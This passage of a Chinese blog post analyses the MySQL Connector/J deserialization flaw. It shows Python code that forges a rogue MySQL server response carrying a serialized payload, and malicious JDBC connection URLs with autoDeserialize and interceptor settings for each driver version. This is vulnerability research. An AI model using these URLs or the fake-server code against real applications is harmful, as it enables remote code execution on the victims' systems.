+<p><img loading="lazy" src="/assets/image-20240806223623-nbxfn9t.png" alt="image" srcset="/assets/image-20240806223623-nbxfn9t.png?size=small, /assets/image-20240806223623-nbxfn9t.png?size=medium 1.5x, /assets/image-20240806223623-nbxfn9t.png?size=large 2x" data-title="image" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>跟进resultSetToMap，在put方法中会发现他会对结果集调用getObject方法</p>
+<p><img loading="lazy" src="/assets/image-20240806223552-52j00g1.png" alt="image" srcset="/assets/image-20240806223552-52j00g1.png?size=small, /assets/image-20240806223552-52j00g1.png?size=medium 1.5x, /assets/image-20240806223552-52j00g1.png?size=large 2x" data-title="image" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>继续跟进getObject方法，此时的结果集会将刚才执行set Autocommit执行结果序列化存储进行反序列化操作，漏洞点就是出在这。</p>
+<p>一个是BITcase的情况</p>
+<p><img loading="lazy" src="/assets/image-20240806223451-pq3xizm.png" alt="image" srcset="/assets/image-20240806223451-pq3xizm.png?size=small, /assets/image-20240806223451-pq3xizm.png?size=medium 1.5x, /assets/image-20240806223451-pq3xizm.png?size=large 2x" data-title="image" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>另外一个是BLOB类型的情况：</p>
+<p><img loading="lazy" src="/assets/image-20240807092516-xluxbou.png" alt="image" srcset="/assets/image-20240807092516-xluxbou.png?size=small, /assets/image-20240807092516-xluxbou.png?size=medium 1.5x, /assets/image-20240807092516-xluxbou.png?size=large 2x" data-title="image" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>两者唯一的不同在于它数据包里面写的是BLOB还是BIT而已，执行逻辑其实是一样的</p>
+<p>既然已经找到了具体的反序列化点，现在还需要保证两个点：</p>
+<ol>
+<li>JDBC在getConnection以及ConnectionImpl的实例化过程中和服务端进行的通信流程不能断，也就是我们要确保代码能够执行到这</li>
+<li>ServerStatusDiffInterceptor在执行preProcess进行SQL查询获取到的结果必须是我们绑定好的恶意序列化数据</li>
+</ol>
+<p>下面一个一个来解决</p>
+<h3 id="伪造通信流程" class="heading-element"><span>伪造通信流程</span>
+  <a href="#%e4%bc%aa%e9%80%a0%e9%80%9a%e4%bf%a1%e6%b5%81%e7%a8%8b" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>这个流程其实就涉及到我们刚才一路跟进的过程，除去前面的流程，我们先来看getObject中的限制。</p>
+<p>在getObject中有这么几个需要注意的地方，首先就是BIT选项，依然还是execSQL之后通过获取到的结果数据字节来判断是否为BIT类型，然后再读取<code>columnIndexMinusOne</code>​的值，也就是在<code>resultSetToMap</code>​中调用的两次getObject，他们给的参数第一个是1，第二个getObject是2，也就是说第一次进入getObject肯定是不能进入BIT选项进行反序列化的，会直接return null。所以需要我们将恶意数据存储到结果集的第二选项中。然后是对于<code>PNAME_autoDeserialize</code>​值，也就是我们启动项中<code>?autoDeserialize=true</code>​的原因，不然就无法进入if判断进行反序列化。</p>
+<p>看完了getObject，我们留到最后去解决，现在回到最开始我们一路创建ConnectionImpl的开始的过程，看看我们为了伪造恶意SQL服务端还需要伪造哪些数据。这里涉及到MySQL的JDBC的认证流程，科学上网了解一下即可。</p>
+<p>首先就是先访问和登录数据库，检测连接状态，这里还是比较好认的</p>
+<p><img loading="lazy" src="/assets/image-20240806223239-e2c2j5q.png" alt="image" srcset="/assets/image-20240806223239-e2c2j5q.png?size=small, /assets/image-20240806223239-e2c2j5q.png?size=medium 1.5x, /assets/image-20240806223239-e2c2j5q.png?size=large 2x" data-title="image" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p><img loading="lazy" src="/assets/image-20240806170205-gjussjc.png" alt="image" srcset="/assets/image-20240806170205-gjussjc.png?size=small, /assets/image-20240806170205-gjussjc.png?size=medium 1.5x, /assets/image-20240806170205-gjussjc.png?size=large 2x" data-title="image" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>首先是服务端发送的一段初始握手报文&ndash;Server Greeting，包含一系列的用于认证身份，密码加盐索要用到的值，以及确定当前认证插件的的名称等等。在此之后，客户端开始向我们发送了一段Login Request的包，主要信息包含客户端填入的username和加盐之后的密码，以及所用到的插件等等</p>
+<p><img loading="lazy" src="/assets/image-20240807100503-nm9wo4t.png" alt="image" srcset="/assets/image-20240807100503-nm9wo4t.png?size=small, /assets/image-20240807100503-nm9wo4t.png?size=medium 1.5x, /assets/image-20240807100503-nm9wo4t.png?size=large 2x" data-title="image" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>之后服务端认证成功之后，返回一段Response-OK包，具体内容如图，整体的16进制形式每次Mysql-JDBC的连接都是相同的<code>0700000200000002000000</code>​</p>
+<p><img loading="lazy" src="/assets/image-20240807094437-9k5d7a9.png" alt="image" srcset="/assets/image-20240807094437-9k5d7a9.png?size=small, /assets/image-20240807094437-9k5d7a9.png?size=medium 1.5x, /assets/image-20240807094437-9k5d7a9.png?size=large 2x" data-title="image" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>之后代码调试界面一路跟进，又在ConnectionImpl的loadServerVariables方法中，发送了两段用来封装客户端属性的请求信息，其中都是用来在服务端需要执行的SQL语句，特殊关键词包括<code>select @session.auto_increment_increment</code>​</p>
+<p>第一段请求信息之后的返回报文如下：从01 00开始后面所有的数据都是而服务端需要返回的</p>
+<p><img loading="lazy" src="/assets/image-20240807103827-3rg8ejh.png" alt="image" srcset="/assets/image-20240807103827-3rg8ejh.png?size=small, /assets/image-20240807103827-3rg8ejh.png?size=medium 1.5x, /assets/image-20240807103827-3rg8ejh.png?size=large 2x" data-title="image" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>第二段发送过来的SQL执行请求只有一句话 <code>show warnings</code>​,返回报文如下，依然还是0100之后的所有数据都是我们需要返回的</p>
+<p><img loading="lazy" src="/assets/image-20240807104434-s35it0o.png" alt="image" srcset="/assets/image-20240807104434-s35it0o.png?size=small, /assets/image-20240807104434-s35it0o.png?size=medium 1.5x, /assets/image-20240807104434-s35it0o.png?size=large 2x" data-title="image" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>之后继续跟进代码，经过多次调试，其实直到最后的<code>SHOW SESSION STATUS</code>​之前，请求的信息和发包内容都是相同的，因为代码走的流程相同，所以之后总结一下前面的服务器返回包内容以及对应的客户端请求即可。</p>
+<p>最后的<code>show session status</code>​指令返回包的结果集该如何构造呢？具体的代码如下，引用一下各大文章中出现的最多的伪造恶意SQL服务器代码：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"> <span class="k">if</span> <span class="s2">&#34;show session status&#34;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">mysql_data</span> <span class="o">=</span> <span class="s1">&#39;0100000102&#39;</span> 
+</span></span><span class="line"><span class="cl">                <span class="n">mysql_data</span> <span class="o">+=</span> <span class="s1">&#39;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#39;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">mysql_data</span> <span class="o">+=</span> <span class="s1">&#39;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#39;</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">#获取payload</span>
+</span></span><span class="line"><span class="cl">                <span class="n">payload_content</span><span class="o">=</span><span class="n">get_payload_content</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">#计算payload长度</span>
+</span></span><span class="line"><span class="cl">                <span class="n">payload_length</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload_content</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span><span class="p">))</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">payload_length_hex</span> <span class="o">=</span> <span class="n">payload_length</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="n">payload_length</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">#计算数据包长度</span>
+</span></span><span class="line"><span class="cl">                <span class="n">data_len</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload_content</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span> <span class="o">+</span> <span class="mi">4</span><span class="p">))</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">data_len_hex</span> <span class="o">=</span> <span class="n">data_len</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">6</span><span class="p">]</span> <span class="o">+</span> <span class="n">data_len</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="n">data_len</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">                <span class="n">mysql_data</span> <span class="o">+=</span> <span class="n">data_len_hex</span> <span class="o">+</span> <span class="s1">&#39;04&#39;</span> <span class="o">+</span> <span class="s1">&#39;fbfc&#39;</span><span class="o">+</span> <span class="n">payload_length_hex</span>
+</span></span><span class="line"><span class="cl">                <span class="n">mysql_data</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="n">payload_content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">mysql_data</span> <span class="o">+=</span> <span class="s1">&#39;07000005fe000022000100&#39;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">send_data</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">mysql_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">data</span> <span class="o">=</span> <span class="n">receive_data</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span></span></span></code></pre></div><p>首先了解一下Mysql的结果集响应包的结构</p>
+<p><img loading="lazy" src="/assets/image-20240807134758-kt69nks.png" alt="image" srcset="/assets/image-20240807134758-kt69nks.png?size=small, /assets/image-20240807134758-kt69nks.png?size=medium 1.5x, /assets/image-20240807134758-kt69nks.png?size=large 2x" data-title="image" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p><img loading="lazy" src="/assets/image-20240807135013-s0f20m7.png" alt="image" srcset="/assets/image-20240807135013-s0f20m7.png?size=small, /assets/image-20240807135013-s0f20m7.png?size=medium 1.5x, /assets/image-20240807135013-s0f20m7.png?size=large 2x" data-title="image" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>具体的构造我也没太深入研究了，第一列的数据<code>0100000102</code>​主要作用就是标识我们存在两列的具体信息。第二列和第三列就是具体的每列信息的列定义，唯一的区别就在于各自的行号数据不同，一个是02，一个是03。然后是EOF的包的问题，如果在这两列列定义之后直接下构造好的EOF包会打不通，我也遇到了这个问题，稍微研究了一下代码层面的问题，如果按照已有的规则添加上EOF包，会存在resultSet中不存在值的情况，也就是提前结束的内容的读取，不知道是否是我构造的问题还是其他问题。</p>
+<p>然后就是在最后执行的时候一些细节问题</p>
+<p>一是，在<code>mappedValues.put(rs.getObject(1), rs.getObject(2));</code>​中，第一次getObject进来肯定会直接进入到if(this.thisRow.getNull(columnIndexMinusOne))的判断中（我截图里面第二次getObject了），所以会直接返回null</p>
+<p><img loading="lazy" src="/assets/image-20240807143109-fs9ua11.png" alt="image" srcset="/assets/image-20240807143109-fs9ua11.png?size=small, /assets/image-20240807143109-fs9ua11.png?size=medium 1.5x, /assets/image-20240807143109-fs9ua11.png?size=large 2x" data-title="image" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>然后是-84和-19标识的就是AC ED，两个字节代表java序列化数据的标识</p>
+<p><img loading="lazy" src="/assets/image-20240807143101-1m4t6tf.png" alt="image" srcset="/assets/image-20240807143101-1m4t6tf.png?size=small, /assets/image-20240807143101-1m4t6tf.png?size=medium 1.5x, /assets/image-20240807143101-1m4t6tf.png?size=large 2x" data-title="image" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>其实构造起来了解一下基本的流程就行，后续还是工具去利用了，简化一些步骤，用到了许少写的工具，然后发现了一个可能是小bug的地方</p>
+<p><a href="https://github.com/4ra1n/mysql-fake-server/releases/tag/0.0.4"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/4ra1n/mysql-fake-server/releases/tag/0.0.4</a></p>
+<p>使用时候注意用户名按照工具里面的生成的规则来写就行，其他就按照正常的payload写就没问题。因为用户名要用于提取Gadget对应name</p>
+<h3 id="利用总结" class="heading-element"><span>利用总结</span>
+  <a href="#%e5%88%a9%e7%94%a8%e6%80%bb%e7%bb%93" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><h4 id="807-8020" class="heading-element"><span>8.0.7-8.0.20</span>
+  <a href="#807-8020" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>综合了一下上面的利用过程，不过多赘述</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">Driver</span><span class="o">=</span><span class="s">&#34;com.mysql.cj.jdbc.Driver&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="n">Driver</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//连接的访问路径</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">url</span><span class="o">=</span><span class="s">&#34;jdbc:mysql://127.0.0.1:3309/jdbc?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;serverTimezone=UTC&amp;useSSL=false&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//进行连接</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Connection</span><span class="w"> </span><span class="n">conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DriverManager</span><span class="p">.</span><span class="na">getConnection</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="s">&#34;root&#34;</span><span class="p">,</span><span class="s">&#34;123456&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Statement</span><span class="w"> </span><span class="n">statement</span><span class="o">=</span><span class="n">conn</span><span class="p">.</span><span class="na">createStatement</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ResultSet</span><span class="w"> </span><span class="n">rs</span><span class="o">=</span><span class="n">statement</span><span class="p">.</span><span class="na">executeQuery</span><span class="p">(</span><span class="s">&#34;select * from users&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">while</span><span class="p">(</span><span class="n">rs</span><span class="p">.</span><span class="na">next</span><span class="p">()){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">rs</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&#34;username&#34;</span><span class="p">)</span><span class="o">+</span><span class="s">&#34; : &#34;</span><span class="o">+</span><span class="n">rs</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&#34;password&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span></span></span></code></pre></div><h4 id="602-606" class="heading-element"><span>6.0.2-6.0.6</span>
+  <a href="#602-606" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>6.x的版本总计这么多，其实我不太明白为甚没有7的版本，直接从6跳到8了</p>
+<p>这里payload的更换的主要原因是queryInterceptors参数更换为了statementInterceptors，其他倒是没有什么不同</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;jdbc:mysql://ip:port/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=base64ZGVzZXJfQ0MzMV9jYWxj&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">String</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;base64ZGVzZXJfQ0MzMV9jYWxj&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">String</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;com.mysql.cj.jdbc.Driver&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DriverManager</span><span class="p">.</span><span class="na">getConnection</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">);</span></span></span></code></pre></div><p>5.x之后都是最开始的5.1.10及以下作为一段，5.1.10以上作为一段，起初我一直在担心一个问题，就是不同版本下，直到最后<code>SHOW SESSION STATUS</code>​之前的流程，客户端所发过来的包会不会有所不同，那我们是否需要根据情况的不同来选择构造不同的回显包呢?带着这样的问题我去调试了一下，客户端发包到伪造服务端开启新线程进行逻辑处理，双向调试的流程下，发现其实不论哪个版本，前几个流程都是一样的。所以就不存在我刚才上面提到的问题。</p>
+<p>但是5.x之后的版本有一点肯定是变的，mysql-jdbc的包名变了，所以相应的payload也在变</p>
+<p>‍</p>
+<h4 id="5111-51x后续版本" class="heading-element"><span>5.1.11-5.1x后续版本</span>
+  <a href="#5111-51x%e5%90%8e%e7%bb%ad%e7%89%88%e6%9c%ac" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;jdbc:mysql://127.0.0.1:3308/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=deser_CC31_calc&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">String</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;deser_CC31_calc&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">String</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;com.mysql.jdbc.Driver&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">DriverManager</span><span class="p">.</span><span class="na">getConnection</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">);</span></span></span></code></pre></div><h4 id="510-5110" class="heading-element"><span>5.1.0-5.1.10</span>
+  <a href="#510-5110" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>唯一的区别在于，触发点不在getConnection了，而是在后续的<code>statement.executeQuery</code>​中</p>
